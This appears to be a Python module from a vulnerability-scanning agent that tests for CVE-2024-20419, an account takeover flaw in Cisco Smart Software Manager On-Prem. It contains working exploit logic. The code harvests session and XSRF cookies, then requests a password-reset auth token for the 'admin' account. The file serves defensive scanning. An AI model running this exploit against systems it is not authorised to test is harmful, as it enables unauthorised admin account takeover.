"""Agent Asteroid implementation for CVE-2024-20419"""

from urllib.parse import unquote
from typing import Any
import logging
import urllib3

import cloudscraper
from requests import exceptions as requests_exceptions
from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "Account Takeover in Cisco Smart Software Manager On-Prem"
VULNERABILITY_REFERENCE = "CVE-2024-20419"
VULNERABILITY_DESCRIPTION = (
    "Cisco Smart Software Manager On-Prem is vulnerable to an account takeover attack. "
    "Attackers can exploit this vulnerability to retrieve an authentication token "
    "and potentially reset the account password."
)
REACHABLE_CHECK_TITLE = "On-Prem License Workspace"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def _get_cookie_value(headers: dict[str, str], cookie_name: str) -> str | None:
    cookies = headers.get("Set-Cookie", "").split(",")
    for cookie in cookies:
        if cookie_name in cookie:
            parts = cookie.split(";")
            for part in parts:
                if cookie_name in part:
                    return part.split("=")[1].strip()
    return None


def _create_vulnerability(target: definitions.Target) -> definitions.Vulnerability:
    entry = kb.Entry(
        title=VULNERABILITY_TITLE,
        risk_rating="CRITICAL",
        short_description=VULNERABILITY_DESCRIPTION,
        description=VULNERABILITY_DESCRIPTION,
        references={
            "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}",
        },
        recommendation=(
            "- Apply security patches from Cisco if available.\n"
            "- Monitor and validate authentication processes.\n"
            "- Restrict access to the vulnerable endpoint."
        ),
        security_issue=True,
        privacy_issue=False,
        has_public_exploit=True,
        targeted_by_malware=False,
        targeted_by_ransomware=False,
        targeted_by_nation_state=False,
    )
    technical_detail = (
        f"{target.origin} is vulnerable to {VULNERABILITY_REFERENCE}: "
        f"{VULNERABILITY_TITLE}"
    )
    return definitions.Vulnerability(
        entry=entry,
        technical_detail=technical_detail,
        risk_rating=agent_report_vulnerability_mixin.RiskRating.CRITICAL,
    )


def _is_endpoint_reachable(session: cloudscraper.CloudScraper, url: str) -> bool:  # type: ignore[no-any-unimported]
    try:
        response = session.get(url, timeout=10)
        response.raise_for_status()
        logger.debug("Reachable Check Response: %s", response.text)
        return REACHABLE_CHECK_TITLE in response.text
    except requests_exceptions.RequestException as e:
        logger.error("HTTP Request failed during reachability check: %s", e)
        return False


def _get_auth_token(  # type: ignore[no-any-unimported]
    session: cloudscraper.CloudScraper, url: str, username: str
) -> Any | None:
    try:
        get_url = f"{url}/backend/settings/oauth_adfs?hostname=polar"
        response = session.get(get_url, timeout=10)
        headers_dict = dict(response.headers)
        xsrf_token = _get_cookie_value(headers_dict, "XSRF-TOKEN")
        lic_engine_session = _get_cookie_value(headers_dict, "_lic_engine_session")

        if xsrf_token is not None:
            xsrf_token = unquote(xsrf_token)

        if lic_engine_session is None or xsrf_token is None:
            logger.error("Required cookies not found.")
            return None

        post_url = f"{url}/backend/reset_password/generate_code"
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "X-Xsrf-Token": xsrf_token,
        }
        cookies = {
            "_lic_engine_session": lic_engine_session,
            "XSRF-TOKEN": xsrf_token,
        }
        payload = {"uid": username}
        post_response = session.post(
            post_url,
            headers=headers,
            cookies=cookies,
            json=payload,
            timeout=60,
        )

        if post_response.status_code == 200:
            try:
                post_response_json = post_response.json()
                auth_token = post_response_json.get("auth_token")
                if auth_token is not None:
                    return str(auth_token)
                else:
                    logger.error("auth_token not found in the response.")
                    return None
            except ValueError:
                logger.error("Error decoding JSON response.")
                return None
        else:
            logger.error(
                "POST Request failed with status code: %d", post_response.status_code
            )
            return None
    except requests_exceptions.RequestException as e:
        logger.error("HTTP Request failed during auth token retrieval: %s", e)
        return None


@exploits_registry.register
class CVE202420419Exploit(definitions.Exploit):
    def accept(self, target: definitions.Target) -> bool:
        return _is_endpoint_reachable(self.session, target.origin)

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        vulnerabilities = []
        auth_token = _get_auth_token(self.session, target.origin, "admin")

        if auth_token is not None:
            vulnerabilities.append(_create_vulnerability(target))

        return vulnerabilities
